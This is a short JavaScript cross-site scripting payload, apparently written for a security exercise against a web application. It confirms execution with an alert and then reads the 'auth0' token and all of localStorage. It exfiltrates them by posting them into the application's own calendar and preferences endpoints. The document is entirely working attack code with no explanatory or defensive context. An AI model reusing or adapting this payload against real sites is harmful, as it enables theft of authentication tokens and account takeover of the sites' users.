// Confirm execution
alert('XSS Executed! Domain: ' + document.domain);

// Steal tokens from localStorage
const authToken = localStorage.getItem('auth0');
const allStorage = JSON.stringify(localStorage);

// Exfiltrate by creating a calendar event with the stolen data
fetch('/calendar', {
  method: 'POST',
  headers: {
    'Accept': 'application/json',
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    title: 'EXFIL-' + document.domain,
    dateStart: '2025-12-25',
    dateEnd: '2025-12-25',
    timeStart: '00:00',
    timeEnd: '23:59',
    moreInformation: 'Auth Token: ' + authToken + '\n\nAll Storage: ' + allStorage
  })
});

// Alternative: exfiltrate via preferences endpoint
fetch('/preferences', {
  method: 'POST', 
  headers: {
    'Accept': 'application/json',
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    stolenData: allStorage
  })
});
